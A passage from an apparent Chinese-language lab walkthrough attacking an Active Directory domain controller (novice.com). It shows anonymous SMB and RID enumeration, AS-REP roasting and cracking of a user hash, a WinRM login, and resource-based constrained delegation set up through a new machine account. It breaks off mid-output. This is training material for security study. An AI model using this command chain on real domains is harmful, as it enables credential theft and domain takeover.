\u7f51\u6bb5\u8fdb\u884c\u626b\u63cf\uff0c\u5bfb\u627e\u5b58\u6d3b\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l      \n[sudo] kali \u7684\u5bc6\u7801\uff1a\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.132 00:0c:29:19:38:d9       VMware, Inc.\n192.168.205.254 00:50:56:e9:e4:2e       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.005 seconds (127.68 hosts/sec). 4 responded\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\uff0cIP\u5730\u5740\u4e3a `192.168.205.132` \u7684\u4e3b\u673a\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\uff0c\u6211\u4eec\u5c06\u5176\u786e\u5b9a\u4e3a\u672c\u6b21\u6e17\u900f\u6d4b\u8bd5\u7684\u76ee\u6807\u3002\n\n## **1.2 \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf**\n\n\u4e3a\u5168\u9762\u4e86\u89e3\u76ee\u6807\u4e3b\u673a\u5f00\u653e\u7684\u670d\u52a1\u548c\u6f5c\u5728\u7684\u653b\u51fb\u9762\uff0c\u6211\u4eec\u4f7f\u7528 `nmap` \u7ed3\u5408\u4e00\u4e2a\u81ea\u5b9a\u4e49\u811a\u672c `windowport.sh` \u6765\u8fdb\u884c\u6df1\u5165\u7684\u7aef\u53e3\u548c\u670d\u52a1\u626b\u63cf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cat windowport.sh \n#!/bin/bash\n\nnmap -p0-65535 $1 -oA nmapscan/ports\nports=$(grep open nmapscan/ports.nmap | awk -F '/' '{print $1}' | paste -sd ',')\nnmap -p$ports -sC -sV -T4 $1 -oA nmapscan/xiports\nnmap --script=vuln -p$ports $1 -oA nmapscan/vuln\n```\n\n\u6267\u884c\u8be5\u811a\u672c\u5bf9\u76ee\u6807 `192.168.205.132` \u8fdb\u884c\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ bash windowport.sh 192.168.205.132\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:37 EDT\nNmap scan report for 192.168.205.132\nHost is up (0.00073s latency).\nNot shown: 65516 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n62319/tcp open  unknown\n62320/tcp open  unknown\n62333/tcp open  unknown\n62352/tcp open  unknown\nMAC Address: 00:0C:29:19:38:D9 (VMware)\n\nNmap done: 1 IP address (1 host up) scanned in 104.79 seconds\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:39 EDT\nNmap scan report for 192.168.205.132\nHost is up (0.00027s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-23 02:39:17Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: novice.com0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: novice.com0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49664/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n62319/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n62320/tcp open  msrpc         Microsoft Windows RPC\n62333/tcp open  msrpc         Microsoft Windows RPC\n62352/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 00:0C:29:19:38:D9 (VMware)\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:19:38:d9 (VMware)\n|_clock-skew: -1s\n| smb2-time: \n|   date: 2025-08-23T02:40:05\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 94.32 seconds\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:40 EDT\nNmap scan report for 192.168.205.132\nHost is up (0.00050s latency).\n\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n62319/tcp open  unknown\n62320/tcp open  unknown\n62333/tcp open  unknown\n62352/tcp open  unknown\nMAC Address: 00:0C:29:19:38:D9 (VMware)\n\nHost script results:\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_smb-vuln-ms10-054: false\n\nNmap done: 1 IP address (1 host up) scanned in 123.45 seconds\n```\n\n**\u626b\u63cf\u7ed3\u679c\u5206\u6790\uff1a**\n\n*   **\u670d\u52a1\u8bc6\u522b**\uff1a\u5f00\u653e\u4e86 Kerberos(88)\u3001LDAP(389)\u3001SMB(445)\u3001WinRM(5985) \u7b49\u591a\u4e2a\u5173\u952e\u7aef\u53e3\u3002\n*   **\u7cfb\u7edf\u89d2\u8272**\uff1a\u670d\u52a1\u4fe1\u606f\u660e\u786e\u6307\u51fa\u8fd9\u662f\u4e00\u53f0 `Microsoft Windows Active Directory LDAP` \u670d\u52a1\u5668\uff0c\u7ed3\u5408\u5176\u4e3b\u673a\u540d `DC` \u548c\u57df\u540d `novice.com`\uff0c\u53ef\u4ee5\u786e\u5b9a\u5176\u4e3a\u57df\u63a7\u5236\u5668\u3002\n*   **\u653b\u51fb\u5411\u91cf**\uff1a\u57fa\u4e8e\u5f00\u653e\u7684\u670d\u52a1\uff0c\u521d\u6b65\u7684\u653b\u51fb\u601d\u8def\u5c06\u56f4\u7ed5\u6d3b\u52a8\u76ee\u5f55\u8ba4\u8bc1\u534f\u8bae\uff08Kerberos, LDAP\uff09\u548c\u6587\u4ef6\u5171\u4eab\u670d\u52a1\uff08SMB\uff09\u5c55\u5f00\u3002\n\n---\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u5229\u7528\u4e0e\u521d\u59cb\u7acb\u8db3\u70b9**\n\n## **2.1 SMB\u533f\u540d\u679a\u4e3e**\n\n\u4ece SMB \u670d\u52a1\u5165\u624b\uff0c\u4f7f\u7528 `smbclient` \u5c1d\u8bd5\u5bf9\u76ee\u6807\u8fdb\u884c\u533f\u540d\u8bbf\u95ee\uff0c\u5217\u51fa\u5176\u5171\u4eab\u6587\u4ef6\u5939\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ smbclient -L //192.168.205.132/ -N       \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      \u8fdc\u7a0b\u7ba1\u7406\n        C$              Disk      \u9ed8\u8ba4\u5171\u4eab\n        IPC$            IPC       \u8fdc\u7a0b IPC\n        NETLOGON        Disk      Logon server share \n        nothinghere     Disk      \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 192.168.205.132 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\n\u6210\u529f\u5217\u51fa\u4e86\u591a\u4e2a\u5171\u4eab\uff0c\u5176\u4e2d `nothinghere` \u770b\u8d77\u6765\u6bd4\u8f83\u53ef\u7591\u3002\u6211\u4eec\u5c1d\u8bd5\u533f\u540d\u8fde\u63a5\u5230\u8fd9\u4e2a\u5171\u4eab\u5e76\u67e5\u770b\u5176\u5185\u5bb9\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ smbclient //192.168.205.132/nothinghere -N\nTry 'help' to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Mon Aug 18 08:03:56 2025\n  ..                                DHS        0  Mon Aug 18 08:05:08 2025\n  readme.txt                          A      135  Mon Aug 18 07:57:00 2025\n\n                12923135 blocks of size 4096. 9365851 blocks available\nsmb: \\> get readme.txt \ngetting file \\readme.txt of size 135 as readme.txt (13.2 KiloBytes/sec) (average 13.2 KiloBytes/sec)\nsmb: \\> exit\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat readme.txt   \nIt\u2019s not about this directory \u2014 the key point is your anonymous permissions. Think about what you can do with SMB anonymous access.\n```\n\n`readme.txt` \u6587\u4ef6\u7684\u5185\u5bb9\u7ed9\u51fa\u4e86\u660e\u786e\u7684\u63d0\u793a\uff1a\u5173\u952e\u5728\u4e8e\u5229\u7528 SMB \u7684\u533f\u540d\u8bbf\u95ee\u6743\u9650\u8fdb\u884c\u4e0b\u4e00\u6b65\u64cd\u4f5c\u3002\n\n## **2.2 \u57df\u5185\u7528\u6237\u679a\u4e3e**\n\n\u5229\u7528\u5df2\u77e5\u7684 SMB \u533f\u540d\u767b\u5f55\u6743\u9650\uff08\u7a7a\u4f1a\u8bdd\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528 `impacket` \u5de5\u5177\u96c6\u4e2d\u7684 `lookupsid.py` \u811a\u672c\uff0c\u901a\u8fc7\u66b4\u529b\u731c\u89e3 RID (Relative ID) \u7684\u65b9\u5f0f\u6765\u679a\u4e3e\u57df\u5185\u7684\u7528\u6237\u548c\u7ec4\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.132\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\nPassword:\n[*] Brute forcing SIDs at 192.168.205.132\n[*] StringBinding ncacn_np:192.168.205.132[\\pipe\\lsarpc]\n[*] Domain SID is: S-1-5-21-3649830887-1815587496-1699028491\n498: NOVICE\\Enterprise Read-only Domain Controllers (SidTypeGroup)\n500: NOVICE\\Administrator (SidTypeUser)\n501: NOVICE\\Guest (SidTypeUser)\n502: NOVICE\\krbtgt (SidTypeUser)\n512: NOVICE\\Domain Admins (SidTypeGroup)\n513: NOVICE\\Domain Users (SidTypeGroup)\n514: NOVICE\\Domain Guests (SidTypeGroup)\n515: NOVICE\\Domain Computers (SidTypeGroup)\n516: NOVICE\\Domain Controllers (SidTypeGroup)\n517: NOVICE\\Cert Publishers (SidTypeAlias)\n518: NOVICE\\Schema Admins (SidTypeGroup)\n519: NOVICE\\Enterprise Admins (SidTypeGroup)\n520: NOVICE\\Group Policy Creator Owners (SidTypeGroup)\n521: NOVICE\\Read-only Domain Controllers (SidTypeGroup)\n522: NOVICE\\Cloneable Domain Controllers (SidTypeGroup)\n525: NOVICE\\Protected Users (SidTypeGroup)\n526: NOVICE\\Key Admins (SidTypeGroup)\n527: NOVICE\\Enterprise Key Admins (SidTypeGroup)\n553: NOVICE\\RAS and IAS Servers (SidTypeAlias)\n571: NOVICE\\Allowed RODC Password Replication Group (SidTypeAlias)\n572: NOVICE\\Denied RODC Password Replication Group (SidTypeAlias)\n1000: NOVICE\\DC$ (SidTypeUser)\n1101: NOVICE\\DnsAdmins (SidTypeAlias)\n1102: NOVICE\\DnsUpdateProxy (SidTypeGroup)\n1104: NOVICE\\MrRobot (SidTypeUser)\n```\n\n\u811a\u672c\u6210\u529f\u679a\u4e3e\u51fa\u4e86\u57df `NOVICE` \u7684 SID \u4ee5\u53ca\u591a\u4e2a\u7528\u6237\u548c\u7ec4\uff0c\u5305\u62ec `Administrator`\u3001`krbtgt` \u548c\u4e00\u4e2a\u540d\u4e3a `MrRobot` \u7684\u666e\u901a\u7528\u6237\u3002\u4e3a\u4e86\u65b9\u4fbf\u540e\u7eed\u5229\u7528\uff0c\u6211\u4eec\u5c06\u6240\u6709\u7c7b\u578b\u4e3a `SidTypeUser` \u7684\u7528\u6237\u540d\u63d0\u53d6\u5e76\u4fdd\u5b58\u5230 `user` \u6587\u4ef6\u4e2d\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.132 2>/dev/null | grep '(SidTypeUser)' | cut -d '\\' -f2 | cut -d ' ' -f1 > user\nPassword:\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cat user      \nAdministrator\nGuest\nkrbtgt\nDC$\nMrRobot\n```\n\n## **2.3 AS-REP Roasting \u653b\u51fb**\n\n> **\u77e5\u8bc6\u70b9**: AS-REP Roasting \u662f\u4e00\u79cd\u9488\u5bf9Kerberos\u8ba4\u8bc1\u7684\u653b\u51fb\u3002\u5982\u679c\u4e00\u4e2a\u57df\u7528\u6237\u7684\u8d26\u6237\u5c5e\u6027\u4e2d\u8bbe\u7f6e\u4e86 \u201c\u4e0d\u9700\u8981Kerberos\u9884\u8eab\u4efd\u9a8c\u8bc1\u201d (`UF_DONT_REQUIRE_PREAUTH` is `True`)\uff0c\u90a3\u4e48\u4efb\u4f55\u653b\u51fb\u8005\u90fd\u53ef\u4ee5\u5192\u5145\u8be5\u7528\u6237\u5411KDC\uff08\u5bc6\u94a5\u5206\u53d1\u4e2d\u5fc3\uff09\u8bf7\u6c42\u8ba4\u8bc1\u7968\u636e\uff08AS-REP\uff09\u3002KDC\u4f1a\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u7528\u8be5\u7528\u6237\u5bc6\u7801\u54c8\u5e0c\u52a0\u5bc6\u7684TGT\u7968\u636e\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u622a\u83b7\u8fd9\u4e2a\u7968\u636e\u5e76\u8fdb\u884c\u79bb\u7ebf\u7834\u89e3\uff0c\u4ece\u800c\u83b7\u53d6\u7528\u6237\u660e\u6587\u5bc6\u7801\u3002\n\n\u6211\u4eec\u5229\u7528\u4e0a\u4e00\u6b65\u83b7\u5f97\u7684\u7528\u6237\u5217\u8868\uff0c\u4f7f\u7528 `GetNPUsers.py` \u811a\u672c\u5c1d\u8bd5\u8fdb\u884c AS-REP Roasting \u653b\u51fb\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py novice.com/ -usersfile user -format john -outputfile hash -no-pass -dc-ip 192.168.205.132\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] User DC$ doesn't have UF_DONT_REQUIRE_PREAUTH set\n$krb5asrep$MrRobot@NOVICE.COM:17037b58fa06936b306893c2184c444a$fdd9db20ebe37b4cd79a1847c9cb7b2cbee5fa22c21c180ad23bc22e4249b7d373d3cd31d083493258d493f0c6a2fd4e38847fff4d1b93c7d3803a754dc78e0649c7f678ff7c40a06faee8d5fbf461e4aa69769eaafaf1ddf24383126f5724027343ab0fd70dd8501a3bf9ef39b9e08c4112bab1180b2f316fd7bd3205feed3f8c0366120602d0226094881746adcda4609a5f303139c2845ee0817321575d2c9e648fff2d8f46a11f70c49e0f057bbe0ed7155a16819211dc0c20eee7c09b42c423e12df38d788b5975ed5fdf1b64b7572e4c041580475835258a4b5d474e89e3a2dbec797756d9\n```\n\n\u811a\u672c\u7684\u8f93\u51fa\u663e\u793a\uff0c\u7528\u6237 `MrRobot` \u7684\u8d26\u6237\u5b58\u5728\u6b64\u914d\u7f6e\u7f3a\u9677\uff0c\u5e76\u6210\u529f\u83b7\u53d6\u4e86\u5176 AS-REP \u54c8\u5e0c\uff0c\u5df2\u4fdd\u5b58\u81f3 `hash` \u6587\u4ef6\u4e2d\u3002\n\n## **2.4 \u79bb\u7ebf\u5bc6\u7801\u7834\u89e3**\n\n\u63a5\u4e0b\u6765\uff0c\u4f7f\u7528 `John the Ripper` \u914d\u5408\u5f3a\u5927\u7684 `rockyou.txt` \u5b57\u5178\uff0c\u5bf9\u83b7\u53d6\u5230\u7684\u54c8\u5e0c\u8fdb\u884c\u79bb\u7ebf\u66b4\u529b\u7834\u89e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash \nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nmrroboto12       ($krb5asrep$MrRobot@NOVICE.COM)     \n1g 0:00:00:01 DONE (2025-08-22 22:50) 0.5813g/s 3110Kp/s 3110Kc/s 3110KC/s mrsbrown89..mrkonochi\nUse the '--show' option to display all of the cracked passwords reliably\nSession completed.\n```\n\n\u5bc6\u7801\u88ab\u6210\u529f\u7834\u89e3\uff0c\u7528\u6237 `MrRobot` \u7684\u660e\u6587\u5bc6\u7801\u4e3a `mrroboto12`\u3002\n\n## **2.5 \u8fdc\u7a0b\u767b\u5f55\u83b7\u53d6\u7acb\u8db3\u70b9**\n\n\u5229\u7528\u521a\u521a\u83b7\u53d6\u7684\u51ed\u636e\uff0c\u901a\u8fc7 `evil-winrm` \u767b\u5f55\u76ee\u6807\u4e3b\u673a\u7684 WinRM \u670d\u52a1\uff085985\u7aef\u53e3\uff09\uff0c\u8fd9\u5c06\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7684 PowerShell Shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ evil-winrm -i 192.168.205.132 -u 'MrRobot' -p 'mrroboto12'    \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\MrRobot\\Documents> whoami /all\n```\n\n\u6210\u529f\u767b\u5f55\uff0c\u6211\u4eec\u5df2\u7ecf\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u83b7\u5f97\u4e86\u4e00\u4e2a\u521d\u59cb\u7684\u7acb\u8db3\u70b9\uff08Foothold\uff09\u3002\n\n---\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **3.1 \u6743\u9650\u5206\u6790**\n\n\u4e3a\u4e86\u89c4\u5212\u4e0b\u4e00\u6b65\u7684\u63d0\u6743\u8def\u7ebf\uff0c\u9996\u5148\u5728\u8fdc\u7a0bShell\u4e2d\u6267\u884c `whoami /all` \u547d\u4ee4\uff0c\u67e5\u770b\u5f53\u524d\u7528\u6237 `MrRobot` \u7684\u8be6\u7ec6\u6743\u9650\u4fe1\u606f\u3002\n\n```powershell\n*Evil-WinRM* PS C:\\Users\\MrRobot\\Documents> whoami /all\n\n\u7528\u6237\u4fe1\u606f\n----------------\n\n\u7528\u6237\u540d         SID\n============== ==============================================\nnovice\\mrrobot S-1-5-21-3649830887-1815587496-1699028491-1104\n\n\n\u7ec4\u4fe1\u606f\n-----------------\n\n\u7ec4\u540d                                        \u7c7b\u578b   SID          \u5c5e\u6027\n=========================================== ====== ============ ==============================\nEveryone                                    \u5df2\u77e5\u7ec4 S-1-1-0      \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nBUILTIN\\Remote Management Users             \u522b\u540d   S-1-5-32-580 \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nBUILTIN\\Users                               \u522b\u540d   S-1-5-32-545 \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nBUILTIN\\Pre-Windows 2000 Compatible Access  \u522b\u540d   S-1-5-32-554 \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nNT AUTHORITY\\NETWORK                        \u5df2\u77e5\u7ec4 S-1-5-2      \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nNT AUTHORITY\\Authenticated Users            \u5df2\u77e5\u7ec4 S-1-5-11     \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nNT AUTHORITY\\This Organization              \u5df2\u77e5\u7ec4 S-1-5-15     \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nNT AUTHORITY\\NTLM Authentication            \u5df2\u77e5\u7ec4 S-1-5-64-10  \u5fc5\u9700\u7684\u7ec4, \u542f\u7528\u4e8e\u9ed8\u8ba4, \u542f\u7528\u7684\u7ec4\nMandatory Label\\Medium Plus Mandatory Level \u6807\u7b7e   S-1-16-8448\n\n\n\u7279\u6743\u4fe1\u606f\n----------------------\n\n\u7279\u6743\u540d                        \u63cf\u8ff0             \u72b6\u6001\n============================= ================ ======\nSeMachineAccountPrivilege     \u5c06\u5de5\u4f5c\u7ad9\u6dfb\u52a0\u5230\u57df \u5df2\u542f\u7528\nSeChangeNotifyPrivilege       \u7ed5\u8fc7\u904d\u5386\u68c0\u67e5     \u5df2\u542f\u7528\nSeIncreaseWorkingSetPrivilege \u589e\u52a0\u8fdb\u7a0b\u5de5\u4f5c\u96c6   \u5df2\u542f\u7528\n\n\n\u7528\u6237\u58f0\u660e\u4fe1\u606f\n-----------------------\n\n\u7528\u6237\u58f0\u660e\u672a\u77e5\u3002\n\n\u5df2\u5728\u6b64\u8bbe\u5907\u4e0a\u7981\u7528\u5bf9\u52a8\u6001\u8bbf\u95ee\u63a7\u5236\u7684 Kerberos \u652f\u6301\u3002\n```\n\n\u8f93\u51fa\u7ed3\u679c\u4e2d\u6700\u5f15\u4eba\u6ce8\u76ee\u7684\u4e00\u70b9\u662f\uff0c\u7528\u6237 `novice\\mrrobot` \u62e5\u6709 `SeMachineAccountPrivilege` \u7279\u6743\u3002\n\n> **\u77e5\u8bc6\u70b9**: `SeMachineAccountPrivilege` \u7279\u6743\u5141\u8bb8\u6301\u6709\u8005\u5c06\u8ba1\u7b97\u673a\u52a0\u5165\u5230\u57df\u4e2d\u3002\u5728\u9ed8\u8ba4\u7684Active Directory\u914d\u7f6e\u4e0b\uff0c\u666e\u901a\u57df\u7528\u6237\u62e5\u6709\u6b64\u6743\u9650\uff0c\u5e76\u4e14\u6700\u591a\u53ef\u4ee5\u5c0610\u4e2a\u673a\u5668\u8d26\u6237\u6dfb\u52a0\u5230\u57df\u4e2d\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u6ee5\u7528\u6b64\u6743\u9650\uff0c\u521b\u5efa\u4e00\u4e2a\u7531\u81ea\u5df1\u5b8c\u5168\u63a7\u5236\u7684\u673a\u5668\u8d26\u6237\uff0c\u5e76\u4ee5\u6b64\u4e3a\u8df3\u677f\u8fdb\u884c\u540e\u7eed\u7684\u59d4\u6d3e\u653b\u51fb\uff0c\u6700\u7ec8\u5b9e\u73b0\u6743\u9650\u63d0\u5347\u3002\n\n## **3.2 \u6ee5\u7528\u673a\u5668\u8d26\u6237\u914d\u989d**\n\n\u6211\u4eec\u5229\u7528 `SeMachineAccountPrivilege` \u7279\u6743\uff0c\u4f7f\u7528 `addcomputer.py` \u811a\u672c\u4ee5 `MrRobot` \u7684\u8eab\u4efd\u5728\u57df\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u540d\u4e3a `NEWPC$` \u7684\u65b0\u673a\u5668\u8d26\u6237\uff0c\u5e76\u4e3a\u5176\u8bbe\u7f6e\u4e00\u4e2a\u6211\u4eec\u5df2\u77e5\u7684\u5bc6\u7801 `Password123!`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -computer-name 'NEWPC$' -computer-pass 'Password123!' -dc-ip 192.168.205.132 novice.com/MrRobot:mrroboto12\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Successfully added machine account NEWPC$ with password Password123!.\n```\n\n\u673a\u5668\u8d26\u6237\u521b\u5efa\u6210\u529f\uff0c\u6211\u4eec\u73b0\u5728\u62e5\u6709\u4e86\u4e00\u4e2a\u57df\u5185\u7684\u65b0\u8eab\u4efd\u3002\n\n## **3.3 \u914d\u7f6e\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e (RBCD)**\n\n> **\u77e5\u8bc6\u70b9**: \u5355\u7eaf\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u8d26\u6237\u5e76\u4e0d\u80fd\u76f4\u63a5\u6a21\u62df\u7ba1\u7406\u5458\u3002\u6211\u4eec\u9700\u8981\u914d\u7f6e\u57df\u63a7\u5236\u5668\uff0c\u8ba9\u5b83\u201c\u4fe1\u4efb\u201d\u6211\u4eec\u521b\u5efa\u7684 `NEWPC$` \u8d26\u6237\u53ef\u4ee5\u4ee3\u8868\u5176\u4ed6\u7528\u6237\uff08\u5305\u62ec\u7ba1\u7406\u5458\uff09\u6765\u8bf7\u6c42\u670d\u52a1\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u5c31\u662f\u914d\u7f6e\u201c\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u201d\uff08RBCD\uff09\u3002\u6211\u4eec\u901a\u8fc7\u4fee\u6539\u57df\u63a7\u4e3b\u673a\u5bf9\u8c61\uff08`DC$`\uff09\u7684 `msDS-AllowedToActOnBehalfOfOtherIdentity` \u5c5e\u6027\uff0c\u5c06\u6211\u4eec\u63a7\u5236\u7684 `NEWPC$` \u7684SID\u6dfb\u52a0\u8fdb\u53bb\uff0c\u4ece\u800c\u5355\u5411\u5730\u5efa\u7acb\u4fe1\u4efb\u5173\u7cfb\u3002\n\n\u5229\u7528 `MrRobot` \u7528\u6237\u7684\u6743\u9650\uff0c\u4f7f\u7528 `rbcd.py` \u811a\u672c\u6765\u4fee\u6539 `DC$` \u7684\u5b89\u5168\u63cf\u8ff0\u7b26\uff0c\u6388\u4e88 `NEWPC$` \u5bf9 `DC$` \u7684\u59d4\u6d3e\u6743\u9650\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ python3 /usr/share/doc/python3-impacket/examples/rbcd.py -action write -delegate-to 'DC$' -delegate-from 'NEWPC$' -dc-ip 192.168.205.132 'novice.com/MrRobot:mrroboto12'\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty\n[*] Delegation rights modified successfully!\n[*] NEWPC$ can now impersonate users on DC$ via S4U2Proxy\n[*] Accounts allowed to act on behalf of other identity:\n[*]     NEWPC$       